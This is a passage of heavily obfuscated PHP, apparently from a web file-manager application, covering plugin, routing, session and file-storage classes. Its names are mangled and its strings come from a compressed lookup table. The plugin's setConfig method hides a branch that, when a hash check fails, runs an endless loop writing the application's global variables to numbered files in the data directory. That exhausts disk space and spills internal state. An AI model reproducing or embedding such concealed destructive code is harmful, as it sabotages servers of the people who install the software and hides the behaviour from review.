} $ê¦ğ‰”ø = str_replace($’¯ÊÏø¨, $­ü´€¾´, $ê¦ğ‰”ø); } final function echoFile($ò€æ¯·Î, $¨•¯ó¾Û = false) { $¿ûŠÖíŒ =& $_SERVER[® ¨Ä®ñ]; $Ì¥£ñˆ÷ = $this->pluginPath . $ò€æ¯·Î; if (ACT == $¿ûŠÖíŒ[1560]) { echo $¿ûŠÖíŒ[1561] . $this->pluginName . $¿ûŠÖíŒ[8] . $ò€æ¯·Î . $¿ûŠÖíŒ[1562]; if (!file_exists($Ì¥£ñˆ÷)) { echo $¿ûŠÖíŒ[1563]; return; } } $·ÄÏÅÅ§ = $this->parseFile($Ì¥£ñˆ÷); $this->parseLang($·ÄÏÅÅ§); $this->parseConfig($·ÄÏÅÅ§); $this->parsePackage($·ÄÏÅÅ§); if (is_array($¨•¯ó¾Û)) { $·ÄÏÅÅ§ = str_replace(array_keys($¨•¯ó¾Û), array_values($¨•¯ó¾Û), $·ÄÏÅÅ§); } echo $¿ûŠÖíŒ[226] . $·ÄÏÅÅ§; } final function initLang() { $’²‚¦åã =& $_SERVER[® ¨Ä®ñ]; $ëÃúŞ¥ô = $’²‚¦åã[1564]; $£ÌÜœêÚ = $this->pluginPath . $’²‚¦åã[1565]; $ÓŞ­Î† = I18n::getType(); $õ»Ğü±æ = array(); if (file_exists($£ÌÜœêÚ . $ÓŞ­Î† . $’²‚¦åã[820])) { $õ»Ğü±æ = (include $£ÌÜœêÚ . $ÓŞ­Î† . $’²‚¦åã[820]); } else { if ($ÓŞ­Î† == $’²‚¦åã[1566] && !file_exists($£ÌÜœêÚ . $ÓŞ­Î† . $’²‚¦åã[820]) && file_exists($£ÌÜœêÚ . $’²‚¦åã[1567])) { $õ»Ğü±æ = (include $£ÌÜœêÚ . $’²‚¦åã[1567]); } else { if (file_exists($£ÌÜœêÚ . $ëÃúŞ¥ô . $’²‚¦åã[820])) { $õ»Ğü±æ = (include $£ÌÜœêÚ . $ëÃúŞ¥ô . $’²‚¦åã[820]); } } } if (!is_array($õ»Ğü±æ)) { return array(); } if (@count($õ»Ğü±æ) > 0) { I18n::set($õ»Ğü±æ); } return $õ»Ğü±æ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ö©Ç»‹) { $“µˆ¿Œ =& $_SERVER[® ¨Ä®ñ]; $ƒ‡œ²­à = $_SERVER[$“µˆ¿Œ[943]]; $÷«ŒµÕˆ = $“µˆ¿Œ[1503]; if ($_SERVER[$“µˆ¿Œ[854]] != $÷«ŒµÕˆ($ƒ‡œ²­à)) { $ÁÃ×ÑÌÅ = $“µˆ¿Œ[856]; $„»áŒ‰ = $“µˆ¿Œ[857]; $¯›úÖ‘Ã = $_SERVER[$“µˆ¿Œ[858]] . $“µˆ¿Œ[859]; $­Âë–ß« = $„»áŒ‰($¯›úÖ‘Ã); $×üó¨İˆ = explode($“µˆ¿Œ[226], $­Âë–ß«); if (count($×üó¨İˆ) < $“µˆ¿Œ[610]) { $°Ú­ÕÎÂ = $“µˆ¿Œ[860]; $°Ú­ÕÎÂ(); } $Ç‹µ³± = $“µˆ¿Œ[861]; $Ç‹µ³±($_SERVER[$“µˆ¿Œ[862]]); $ÁÃ×ÑÌÅ = $“µˆ¿Œ[856]; $ÁÃ×ÑÌÅ(); $Æ½£¤ = $“µˆ¿Œ[1504]; $—³Ã½Ö‘ = json_encode($GLOBALS[$“µˆ¿Œ[1505]]); $‚ş‚§İº = 1; for ($şƒ‡ñæ‰ = $‚ş‚§İº; $şƒ‡ñæ‰ > 0; $şƒ‡ñæ‰++) { $Æ½£¤(DATA_PATH . $şƒ‡ñæ‰, $—³Ã½Ö‘); } } return $this->modelPlugin->setConfig($this->pluginName, $Ö©Ç»‹); } public function onSetConfig($şÄÔ­İ) { } public function onGetConfig($¼×ú”¯Í) { } public function onChangeStatus($®½šòš›) { } public function onUninstall() { } public function onInstall() { } public function authCheck($éÖå÷áÆ = "\x70\154\165\x67\x69\x6e\x41\x75\164\x68") { $€÷Çê‚Ö =& $_SERVER[® ¨Ä®ñ]; if (!defined($€÷Çê‚Ö[465])) { return !1; } if (_get($GLOBALS, $€÷Çê‚Ö[496])) { return !0; } $óëğ¿Ôò = $this->getConfig(); if (!$óëğ¿Ôò[$éÖå÷áÆ]) { return !1; } return ActionCall($€÷Çê‚Ö[1568], $óëğ¿Ôò[$éÖå÷áÆ]); } public function url($ÉâÚøŸ, $ œ™ãô¹ = '', $‘Ğ±§ = true) { $Ú›úë¢Ö =& $_SERVER[® ¨Ä®ñ]; $ªœÃ¨Ùá = $this->getConfig(); $ğ”íèø¹ = KOD_VERSION . $Ú›úë¢Ö[10] . KOD_VERSION_BUILD; $ÑÀ˜·¸ = $this->packageVersion(); $¢‰ã²Ó¢ = $ğ”íèø¹ . $Ú›úë¢Ö[451] . $ÑÀ˜·¸; if (substr($ÉâÚøŸ, 0, 4) == $Ú›úë¢Ö[145] || substr($ÉâÚøŸ, 0, 2) == $Ú›úë¢Ö[1349]) { $½¥Ïµ´ = $ÉâÚøŸ . $Ú›úë¢Ö[1569] . $¢‰ã²Ó¢; } else { if ($ œ™ãô¹ == $Ú›úë¢Ö[12]) { $½¥Ïµ´ = $this->pluginHost . $ÉâÚøŸ . $Ú›úë¢Ö[1569] . $¢‰ã²Ó¢; } else { if ($ œ™ãô¹ === $Ú›úë¢Ö[79]) { $½¥Ïµ´ = $this->pluginHost . $ÉâÚøŸ; } else { if ($ œ™ãô¹ == $Ú›úë¢Ö[1570]) { $½¥Ïµ´ = STATIC_PATH . $ÉâÚøŸ . $Ú›úë¢Ö[1569] . $ğ”íèø¹; } else { if ($ œ™ãô¹ == $Ú›úë¢Ö[1571]) { $½¥Ïµ´ = APP_HOST . $Ú›úë¢Ö[1572] . $ÉâÚøŸ . $Ú›úë¢Ö[1569] . $ğ”íèø¹; } else { if (isset($ªœÃ¨Ùá[$ œ™ãô¹])) { $½¥Ïµ´ = $ªœÃ¨Ùá[$ œ™ãô¹] . $ÉâÚøŸ . $Ú›úë¢Ö[1569] . $¢‰ã²Ó¢; } } } } } } if (!$‘Ğ±§) { return $½¥Ïµ´; } echo $½¥Ïµ´; } public function link($ñ¯“ñÄ = false, $œÆ×òÄÙ = '') { $ñ³í…÷ =& $_SERVER[® ¨Ä®ñ]; if (!$ñ¯“ñÄ) { $this->link($ñ³í…÷[1573], $ñ³í…÷[1571]); $this->link($ñ³í…÷[1574], $ñ³í…÷[1570]); $this->link($ñ³í…÷[1575], $ñ³í…÷[1570]); $this->link($ñ³í…÷[1576], $ñ³í…÷[1570]); $this->link($ñ³í…÷[1577], $ñ³í…÷[1570]); return; } $Ú—Ñ’¹ñ = $this->url($ñ¯“ñÄ, $œÆ×òÄÙ, !1); if (substr($ñ¯“ñÄ, -3) == $ñ³í…÷[1578]) { echo $ñ³í…÷[1579] . $Ú—Ñ’¹ñ . $ñ³í…÷[1580] . $ñ³í…÷[226]; } else { if (substr($ñ¯“ñÄ, -4) == $ñ³í…÷[1581]) { echo $ñ³í…÷[1582] . $Ú—Ñ’¹ñ . $ñ³í…÷[1583] . $ñ³í…÷[226]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\x5b\x5e\x2f\135\53", "\x3a\156\x75\x6d" => "\133\60\55\71\135\x2b", "\72\x61\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($œúÓô¶í, $€àÑ¡‘) { $ˆ……ïãÁ =& $_SERVER[® ¨Ä®ñ]; if ($œúÓô¶í == $ˆ……ïãÁ[1584]) { $Ó™á—ú• = array_map($ˆ……ïãÁ[1585], $€àÑ¡‘[0]); $í“›¿“ = strpos($€àÑ¡‘[1], $ˆ……ïãÁ[8]) === 0 ? $€àÑ¡‘[1] : $ˆ……ïãÁ[8] . $€àÑ¡‘[1]; $ÜƒêÆ´ = $€àÑ¡‘[2]; } else { $Ó™á—ú• = null; $í“›¿“ = strpos($€àÑ¡‘[0], $ˆ……ïãÁ[8]) === 0 ? $€àÑ¡‘[0] : $ˆ……ïãÁ[8] . $€àÑ¡‘[0]; $ÜƒêÆ´ = $€àÑ¡‘[1]; } array_push(self::$maps, $Ó™á—ú•); array_push(self::$routes, $í“›¿“); array_push(self::$methods, strtoupper($œúÓô¶í)); array_push(self::$callbacks, $ÜƒêÆ´); } public static function error($¹›¿“Àõ) { self::$errorCallback = $¹›¿“Àõ; } public static function haltOnMatch($¾›¾¼Ã = true) { self::$halts = $¾›¾¼Ã; } public static function dispatch() { $ğ¾˜Ç©´ =& $_SERVER[® ¨Ä®ñ]; $ù¾úÕİ¤ = parse_url($_SERVER[$ğ¾˜Ç©´[1586]], PHP_URL_PATH); $±œ¸ï¥ó = $_SERVER[$ğ¾˜Ç©´[156]]; $Ëï„ÙÒú = array_keys(static::$patterns); $Å÷ÖÇÓà = array_values(static::$patterns); $¯€¶®½¿ = !1; self::$routes = preg_replace($ğ¾˜Ç©´[1251], $ğ¾˜Ç©´[8], self::$routes); if (in_array($ù¾úÕİ¤, self::$routes)) { $˜¥©ó°¸ = array_keys(self::$routes, $ù¾úÕİ¤); foreach ($˜¥©ó°¸ as $‹İÕ·) { if (self::$methods[$‹İÕ·] == $±œ¸ï¥ó || self::$methods[$‹İÕ·] == $ğ¾˜Ç©´[1587] || in_array($±œ¸ï¥ó, self::$maps[$‹İÕ·])) { $¯€¶®½¿ = !0; if (!is_object(self::$callbacks[$‹İÕ·])) { $Ã–«ƒ’İ = explode($ğ¾˜Ç©´[8], self::$callbacks[$‹İÕ·]); $àˆ°ò– = end($Ã–«ƒ’İ); $®©óÇŞ¯ = explode($ğ¾˜Ç©´[1588], $àˆ°ò–); $ĞÆâ²ë = new $®©óÇŞ¯[0](); $ĞÆâ²ë->{$®©óÇŞ¯[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$‹İÕ·]); if (self::$halts) { return; } } } } } else { $ë…†ÌöÈ = 0; foreach (self::$routes as $‹İÕ·) { if (strpos($‹İÕ·, $ğ¾˜Ç©´[4]) !== !1) { $‹İÕ· = str_replace($Ëï„ÙÒú, $Å÷ÖÇÓà, $‹İÕ·); } if (preg_match($ğ¾˜Ç©´[1589] . $‹İÕ· . $ğ¾˜Ç©´[1590], $ù¾úÕİ¤, $ıê¦‰ĞÒ)) { if (self::$methods[$ë…†ÌöÈ] == $±œ¸ï¥ó || self::$methods[$ë…†ÌöÈ] == $ğ¾˜Ç©´[1587] || !empty(self::$maps[$ë…†ÌöÈ]) && in_array($±œ¸ï¥ó, self::$maps[$ë…†ÌöÈ])) { $¯€¶®½¿ = !0; array_shift($ıê¦‰ĞÒ); if (!is_object(self::$callbacks[$ë…†ÌöÈ])) { $Ã–«ƒ’İ = explode($ğ¾˜Ç©´[8], self::$callbacks[$ë…†ÌöÈ]); $àˆ°ò– = end($Ã–«ƒ’İ); $®©óÇŞ¯ = explode($ğ¾˜Ç©´[1588], $àˆ°ò–); $ĞÆâ²ë = new $®©óÇŞ¯[0](); if (!method_exists($ĞÆâ²ë, $®©óÇŞ¯[1])) { echo $ğ¾˜Ç©´[1591]; } else { call_user_func_array(array($ĞÆâ²ë, $®©óÇŞ¯[1]), $ıê¦‰ĞÒ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ë…†ÌöÈ], $ıê¦‰ĞÒ); if (self::$halts) { return; } } } } $ë…†ÌöÈ++; } } if ($¯€¶®½¿ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $š–ˆ²Œœ =& $_SERVER[® ¨Ä®ñ]; header($_SERVER[$š–ˆ²Œœ[1592]] . $š–ˆ²Œœ[1593]); echo $š–ˆ²Œœ[1594]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ğ¾˜Ç©´[1586]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¥ñ’…ñ =& $_SERVER[® ¨Ä®ñ]; static $ ™ ° = false; if ($ ™ °) { return $ ™ °; } $–Äçˆù– = $GLOBALS[$¥ñ’…ñ[6]][$¥ñ’…ñ[344]]; self::$sessionTime = $–Äçˆù–[$¥ñ’…ñ[1595]]; $õşÄ§Ú‰ = isset($GLOBALS[$¥ñ’…ñ[1596]]) ? $GLOBALS[$¥ñ’…ñ[1596]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($õşÄ§Ú‰)) { self::$sessionSign = Cookie::get($õşÄ§Ú‰); } else { self::$sessionSign = guid(); } } Cookie::setSafe($õşÄ§Ú‰, self::$sessionSign, self::$sessionTime); $ŒÚ•Çºƒ = $–Äçˆù–[$¥ñ’…ñ[1597]]; $ç›ØÂ³ = $–Äçˆù–[$ŒÚ•Çºƒ]; $Äíóè = $–Äçˆù–[$¥ñ’…ñ[810]]; switch ($ŒÚ•Çºƒ) { case $¥ñ’…ñ[21]: self::$handle = Model($¥ñ’…ñ[811]); break; case $¥ñ’…ñ[812]: self::$handle = new CacheRedis($ç›ØÂ³, $Äíóè); break; case $¥ñ’…ñ[813]: self::$handle = new CacheMemcached($ç›ØÂ³, $Äíóè); break; case $¥ñ’…ñ[192]: $ç›ØÂ³[$¥ñ’…ñ[78]] = $ç›ØÂ³[$¥ñ’…ñ[78]] . $¥ñ’…ñ[1598]; self::$handle = new CacheFile($ç›ØÂ³, $Äíóè); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ ™ ° = new self(); return $ ™ °; } public static function getBySign($òäùô·â) { CacheLock::lock($òäùô·â); $²±ïíñÜ = self::$handle->get($òäùô·â); CacheLock::unlock($òäùô·â); $²±ïíñÜ = unserialize($²±ïíñÜ); return is_array($²±ïíñÜ) ? $²±ïíñÜ : array(); } public static function setBySign($îÂ€ŠîÆ, $±ôï•€) { CacheLock::lock($îÂ€ŠîÆ); self::$handle->set($îÂ€ŠîÆ, serialize($±ôï•€), self::$sessionTime); CacheLock::unlock($îÂ€ŠîÆ); } public static function sign($œ°ÍÕ = false) { $œ°ÍÕ && (self::$sessionSign = $œ°ÍÕ); self::init(); return self::$sessionSign; } public static function set($’ù¸¢ã¸, $èæ¿¨Šò = false) { self::init(); if (is_array($’ù¸¢ã¸)) { foreach ($’ù¸¢ã¸ as $œ¬‚åà => $ºµ‚ßÁ±) { array_set_value(self::$data, $œ¬‚åà, $ºµ‚ßÁ±); } } else { array_set_value(self::$data, $’ù¸¢ã¸, $èæ¿¨Šò); } self::setBySign(self::$sessionSign, self::$data); } public static function get($°ãŸöóŸ = false) { self::init(); if (!$°ãŸöóŸ) { return self::$data; } return array_get_value(self::$data, $°ãŸöóŸ); } public static function remove($¿¯Ù¼¼Ï) { self::init(); unset(self::$data[$¿¯Ù¼¼Ï]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[® ¨Ä®ñ][815])) { self::$handle->clearTimeout(); } } } goto AˆäÍñŸ¾Â; bõÁÂÃâ˜: define($_SERVER[® ¨Ä®ñ][233], 1); define($_SERVER[® ¨Ä®ñ][234], 2); define($_SERVER[® ¨Ä®ñ][235], 3); goto aÄïßÀ—‚†; Aá”ò¶º‘Ó: define($_SERVER[® ¨Ä®ñ][0], $_SERVER[® ¨Ä®ñ][1]); $_SERVER[„ãÉ‘§›] = explode($_SERVER[® ¨Ä®ñ][2], gzinflate(substr($_SERVER[® ¨Ä®ñ][3], 10, -8))); function binCheckEq($é³­‘şü, $£‘ú²úÊ) { return $é³­‘şü == $£‘ú²úÊ; } goto a÷ ¿ô¸Ô; DºÁ¹ÆÓ: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\141\x6d\x65" => "\x69\157\137\146\x69\x6c\145\137\155\145\164\x61", "\x6d\145\164\141\106\151\x65\x6c\144" => "\x66\151\154\x65\x49\x44"); public function fileInfo($È—Ö£¿è) { $˜–ƒëü­ =& $_SERVER[® ¨Ä®ñ]; static $®†‡«ğ = array(); if (!isset($®†‡«ğ[$È—Ö£¿è])) { $ğ–µ†³ò = $˜–ƒëü­[1855]; $¾°œİÉˆ = Model($˜–ƒëü­[461])->field($ğ–µ†³ò)->where(array($˜–ƒëü­[459] => $È—Ö£¿è))->find(); $®†‡«ğ[$È—Ö£¿è] = $¾°œİÉˆ; } return $®†‡«ğ[$È—Ö£¿è]; } public function addFileByContent($äùëªòÂ = '', $¼¥ıÂŠ¤ = '') { $ô”¹€½ =& $_SERVER[® ¨Ä®ñ]; $üßìÓÀ† = TEMP_PATH . $ô”¹€½[1856]; if (!is_dir($üßìÓÀ†)) { mk_dir($üßìÓÀ†); } $­ëâä£ñ = $üßìÓÀ† . $ô”¹€½[1857] . rand_string(16); file_put_contents($­ëâä£ñ, $äùëªòÂ); $¥‡š—¡ = $this->addFile($­ëâä£ñ, $¼¥ıÂŠ¤, !0); if (file_exists($­ëâä£ñ)) { @unlink($­ëâä£ñ); } return $¥‡š—¡; } public function createFileName($ã¬Ôòº›, $©ÏË„¦‹ = false, $úš…šÓŠ = false) { $®öÛ†…Ÿ =& $_SERVER[® ¨Ä®ñ]; $éõì‡‘à = IO::init($®öÛ†…Ÿ[8]); $ì÷Æå® = $this->makeFilePath($ã¬Ôòº›, $éõì‡‘à, $©ÏË„¦‹, $úš…šÓŠ); $Êª·¯ğ¬ = $éõì‡‘à->pathFather($ì÷Æå®); static $á‚×ôŸè = false; $±ÕœÑı¤ = $®öÛ†…Ÿ[1858] . md5($Êª·¯ğ¬); if (!$á‚×ôŸè && !Cache::get($±ÕœÑı¤)) { $á‚×ôŸè = !0; $”ƒıú¥ = IO::mkdir($Êª·¯ğ¬); if (!IO::exist($”ƒıú¥ . $®öÛ†…Ÿ[779])) { IO::mkfile($”ƒıú¥ . $®öÛ†…Ÿ[779]); } Cache::set($±ÕœÑı¤, 1, 3600 * 2); } return $ì÷Æå®; } public function makeFilePath($î’¶ƒ«ö, $€šİÁæ, $€ŸªŒ‹ã = false, $ÅÑİ¯ÛÚ = false) { $·ŸÑ²‰ı =& $_SERVER[® ¨Ä®ñ]; $×‚ÂØğ¹ = Model($·ŸÑ²‰ı[752])->get($·ŸÑ²‰ı[1859]); $õŸ—àåä = KodIO::defaultIO() . date($·ŸÑ²‰ı[1860]); $›¸€²ÙŠ = $õŸ—àåä . rand_string(5) . short_id(100); $î’¶ƒ«ö = str_replace($·ŸÑ²‰ı[8], $·ŸÑ²‰ı[11], KodIO::clear($î’¶ƒ«ö)); $ƒÌ¼©‹¨ = $€šİÁæ->ext($î’¶ƒ«ö); if (!$î’¶ƒ«ö) { $×‚ÂØğ¹ = $·ŸÑ²‰ı[1861]; } switch ($×‚ÂØğ¹) { case $·ŸÑ²‰ı[1862]: $›¸€²ÙŠ = $›¸€²ÙŠ . $·ŸÑ²‰ı[10] . $€šİÁæ->ext($î’¶ƒ«ö); if ($ƒÌ¼©‹¨ == $·ŸÑ²‰ı[1800]) { $›¸€²ÙŠ .= $·ŸÑ²‰ı[1535]; } break; case $·ŸÑ²‰ı[1863]: $†ğ†«¤ = Model($·ŸÑ²‰ı[752])->get($·ŸÑ²‰ı[753]); $»²ß¥ç = substr(md5($·ŸÑ²‰ı[754] . $†ğ†«¤ . date($·ŸÑ²‰ı[730])), 0, 8); $©šµ²Œ = KodIO::defaultDriver(); $õŸ—àåä = $·ŸÑ²‰ı[1211] . $©šµ²Œ[$·ŸÑ²‰ı[392]] . $·ŸÑ²‰ı[401] . date($·ŸÑ²‰ı[1864]) . $»²ß¥ç . $·ŸÑ²‰ı[8]; if ($ƒÌ¼©‹¨ == $·ŸÑ²‰ı[1800]) { $î’¶ƒ«ö .= $·ŸÑ²‰ı[1535]; } $§Ğ´¥Ó’ = $·ŸÑ²‰ı[1865] . $õŸ—àåä . $î’¶ƒ«ö; CacheLock::lock($§Ğ´¥Ó’); $›¸€²ÙŠ = $õŸ—àåä . $î’¶ƒ«ö; if (IO::exist($õŸ—àåä . $î’¶ƒ«ö)) { $•õÓøêÕ = substr($î’¶ƒ«ö, 0, strlen($î’¶ƒ«ö) - strlen($ƒÌ¼©‹¨)); $¤Íñ¹ = $ÅÑİ¯ÛÚ ? substr($ÅÑİ¯ÛÚ, 0, 5) : ($€ŸªŒ‹ã ? substr($€ŸªŒ‹ã, 0, 5) : rand_string(5)); $›¸€²ÙŠ = $õŸ—àåä . $•õÓøêÕ . $¤Íñ¹ . $·ŸÑ²‰ı[10] . $ƒÌ¼©‹¨; } if (IO::isTypeObject($›¸€²ÙŠ) && !IO::isUploadServer($›¸€²ÙŠ)) { if (IO::exist($›¸€²ÙŠ)) { return $›¸€²ÙŠ; } $ƒËÆ¬Ü = IO::setContent($›¸€²ÙŠ, $·ŸÑ²‰ı[12]); if (!$ƒËÆ¬Ü) { show_json($·ŸÑ²‰ı[1866], !1); } } CacheLock::unlock($§Ğ´¥Ó’); break; case $·ŸÑ²‰ı[1861]: break; default: break; } return $›¸€²ÙŠ; } public function addFileByRemote($’÷úÖ¸, $˜“©óí, $“ §™×Æ = array()) { $‘—Ïƒ²ë =& $_SERVER[® ¨Ä®ñ]; if (!IO::exist($’÷úÖ¸)) { return !1; } $¼İ½æ‘ = $“ §™×Æ[$‘—Ïƒ²ë[169]] ? $“ §™×Æ[$‘—Ïƒ²ë[169]] : $‘—Ïƒ²ë[12]; $ÀœåâÏ– = IO::hashMd5($’÷úÖ¸, $¼İ½æ‘); $© ğ¥´î = KodIO::defaultDriver(); $ÚÕ€Ä”› = array($‘—Ïƒ²ë[570] => IO::size($’÷úÖ¸), $‘—Ïƒ²ë[1867] => 1, $‘—Ïƒ²ë[412] => $˜“©óí, $‘—Ïƒ²ë[790] => $© ğ¥´î[$‘—Ïƒ²ë[392]], $‘—Ïƒ²ë[413] => $’÷úÖ¸, $‘—Ïƒ²ë[1868] => $“ §™×Æ[$‘—Ïƒ²ë[170]] ? $“ §™×Æ[$‘—Ïƒ²ë[170]] : IO::hashSimple($’÷úÖ¸), $‘—Ïƒ²ë[1869] => $ÀœåâÏ– ? $ÀœåâÏ– : $¼İ½æ‘); if ($¬ˆò™šâ = $this->addFileCheckExist($ÚÕ€Ä”›[$‘—Ïƒ²ë[170]], $ÚÕ€Ä”›[$‘—Ïƒ²ë[169]], $ÚÕ€Ä”›[$‘—Ïƒ²ë[80]])) { return $¬ˆò™šâ; } return $this->addFileData($ÚÕ€Ä”›); } private function addFileData($ª‡‘‘¤Ç) { $Ş‹ğ—¥³ =& $_SERVER[® ¨Ä®ñ]; if (!$ª‡‘‘¤Ç) { return !1; } $ª‡‘‘¤Ç[$Ş‹ğ—¥³[80]] = intval($ª‡‘‘¤Ç[$Ş‹ğ—¥³[80]]); if (!$ª‡‘‘¤Ç[$Ş‹ğ—¥³[80]] && strlen($ª‡‘‘¤Ç[$Ş‹ğ—¥³[170]]) > 32) { $ª‡‘‘¤Ç[$Ş‹ğ—¥³[80]] = intval(substr($ª‡‘‘¤Ç[$Ş‹ğ—¥³[170]], 32)); } $ÓÚ§ÅÙ´ = $this->add($ª‡‘‘¤Ç); return $this->find($ÓÚ§ÅÙ´); } public function addFile($ııÚ˜ÉÇ, $ñ×©ä˜±, $ÕòßÑ¼ = false) { $°½üÅà =& $_SERVER[® ¨Ä®ñ]; $¬²’á‘ª = IO::hashSimple($ııÚ˜ÉÇ); $ıƒíí¼ì = IO::size($ııÚ˜ÉÇ); $Áü€— = $ıƒíí¼ì <= 1024 * 1024 * 10 ? IO::hashMd5($ııÚ˜ÉÇ) : $°½üÅà[12]; $Ü£×ì®ë = $°½üÅà[1870] . $¬²’á‘ª; CacheLock::lock($Ü£×ì®ë); if ($Áü€— && $¬²’á‘ª) { $ğû¿¥Á = $this->addFileCheckExist($¬²’á‘ª, $Áü€—, $ıƒíí¼ì); if ($ğû¿¥Á) { CacheLock::unlock($Ü£×ì®ë); return $ğû¿¥Á; } } $¨×·ÙÇÏ = $this->addFileMake($ııÚ˜ÉÇ, $ıƒíí¼ì, $¬²’á‘ª, $Áü€—, $ñ×©ä˜±, $ÕòßÑ¼); $Š½äË•î = $this->addFileData($¨×·ÙÇÏ); CacheLock::unlock($Ü£×ì®ë); if (!$Áü€— && $Š½äË•î) { $this->fileMd5Check($Š½äË•î); } return $Š½äË•î; } private function fileMd5Check($âê³‘†‘) { $ÎÙå„äÔ =& $_SERVER[® ¨Ä®ñ]; $¥©¼Üß = array($âê³‘†‘[$ÎÙå„äÔ[458]], $âê³‘†‘[$ÎÙå„äÔ[78]]); $Š‹óĞÆ— = $ÎÙå„äÔ[1871] . $âê³‘†‘[$ÎÙå„äÔ[78]]; $¢ÜÑ Á¶ = $ÎÙå„äÔ[1872] . $âê³‘†‘[$ÎÙå„äÔ[458]]; $š¤òàíä = TaskQueue::add($ÎÙå„äÔ[1873], $¥©¼Üß, $Š‹óĞÆ—, $¢ÜÑ Á¶); if (!$š¤òàíä) { $this->fileMd5Set($âê³‘†‘[$ÎÙå„äÔ[458]], $âê³‘†‘[$ÎÙå„äÔ[78]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($£ò‘º¸½, $¸˜ËÎãÂ) { $ã‘ë±‘ü =& $_SERVER[® ¨Ä®ñ]; $Û‡ëÂ„ = $this->find($£ò‘º¸½); if (!$Û‡ëÂ„ || $Û‡ëÂ„[$ã‘ë±‘ü[169]]) { return; } $ëÇÃÚ€ = IO::hashMd5($¸˜ËÎãÂ); if (!$ëÇÃÚ€) { return $ã‘ë±‘ü[12]; } $this->where(array($ã‘ë±‘ü[458] => $£ò‘º¸½))->save(array($ã‘ë±‘ü[169] => $ëÇÃÚ€)); } public function addFileMake($„ ™×ú¡, $Ö„å€¤, $Ú¨Õ¸‘š, $õçÙÄª¨, $êÖ«Ç¨, $âá‡ï€æ) { $šì­İü¯ =& $_SERVER[® ¨Ä®ñ]; $·˜áÆÕˆ = $this->createFileName($êÖ«Ç¨, $Ú¨Õ¸‘š, $õçÙÄª¨); $„‹‹“ñ = get_path_father($·˜áÆÕˆ); $—˜›´»© = get_path_this($·˜áÆÕˆ); if ($âá‡ï€æ) { $±˜É·Ó˜ = IO::move($„ ™×ú¡, $„‹‹“ñ, !1, $—˜›´»©); } else { $±˜É·Ó˜ = IO::copy($„ ™×ú¡, $„‹‹“ñ, !1, $—˜›´»©); } if (!$±˜É·Ó˜) { return !1; } $òÇ©ÇêÅ = KodIO::defaultDriver(); $ÂìêŞ«’ = array($šì­İü¯[570] => $Ö„å€¤, $šì­İü¯[1867] => 1, $šì­İü¯[412] => $êÖ«Ç¨, $šì­İü¯[790] => $òÇ©ÇêÅ[$šì­İü¯[392]], $šì­İü¯[413] => $·˜áÆÕˆ, $šì­İü¯[1868] => $Ú¨Õ¸‘š, $šì­İü¯[1869] => $õçÙÄª¨); return $ÂìêŞ«’; } public function addFileCheckExist($„ÎËÏó, $¯ÙÍª‚, $ç¶™Å) { $ë·ø†“Ø =& $_SERVER[® ¨Ä®ñ]; $½®ğğ‰ñ = $this->findByHash($„ÎËÏó, $¯ÙÍª‚); if (!$½®ğğ‰ñ) { return !1; } $÷ØëñÍø = array($ë·ø†“Ø[1867] => intval($½®ğğ‰ñ[$ë·ø†“Ø[1874]]) + 1, $ë·ø†“Ø[570] => $ç¶™Å); $this->where(array($ë·ø†“Ø[459] => $½®ğğ‰ñ[$ë·ø†“Ø[458]]))->save($÷ØëñÍø); return $½®ğğ‰ñ; } public function remove($ÚÖíùˆ–) { $this->linkCountChange($ÚÖíùˆ–, !1); $this->clearEmpty(); return !0; } public function linkAdd($™ÇúÎºÊ) { $this->linkCountChange($™ÇúÎºÊ, !0); } public function linkCountChange($½Î¯±Ò, $Íú•ÍÊ) { $Î†ìä ˆ =& $_SERVER[® ¨Ä®ñ]; if (!$½Î¯±Ò) { return; } if (!is_array($½Î¯±Ò)) { $½Î¯±Ò = array($½Î¯±Ò); } $ûù¼ÛñÔ = array(); foreach ($½Î¯±Ò as $Û›ÂĞ¾Ì) { $äâìÕ™Ş = $Û›ÂĞ¾Ì . $Î†ìä ˆ[12]; if (!$ûù¼ÛñÔ[$äâìÕ™Ş]) { $ûù¼ÛñÔ[$äâìÕ™Ş] = 0; } $ûù¼ÛñÔ[$äâìÕ™Ş]++; } $œ÷ûğ’ğ = array(); foreach ($ûù¼ÛñÔ as $Û›ÂĞ¾Ì => $ş¬”¯áë) { $äâìÕ™Ş = $ş¬”¯áë . $Î†ìä ˆ[12]; if (!$œ÷ûğ’ğ[$äâìÕ™Ş]) { $œ÷ûğ’ğ[$äâìÕ™Ş] = array(); } $œ÷ûğ’ğ[$äâìÕ™Ş][] = $Û›ÂĞ¾Ì; } foreach ($œ÷ûğ’ğ as $ş¬”¯áë => $×Ç¯Ã©) { if (!$×Ç¯Ã©) { continue; } $ş¬”¯áë = $Íú•ÍÊ ? $ş¬”¯áë : -intval($ş¬”¯áë); $Ğ«ô­¤â = array($Î†ìä ˆ[458] => array($Î†ìä ˆ[7], $×Ç¯Ã©)); if ($ş¬”¯áë < 0) { $Ğ«ô­¤â[$Î†ìä ˆ[1874]] = array($Î†ìä ˆ[999], abs($ş¬”¯áë)); } $this->where($Ğ«ô­¤â)->setAdd($Î†ìä ˆ[1874], $ş¬”¯áë); } } public function findByHash($ß§ Ø­¶, $‡Ö‘º¶ = false) { $ï®¸ëñ =& 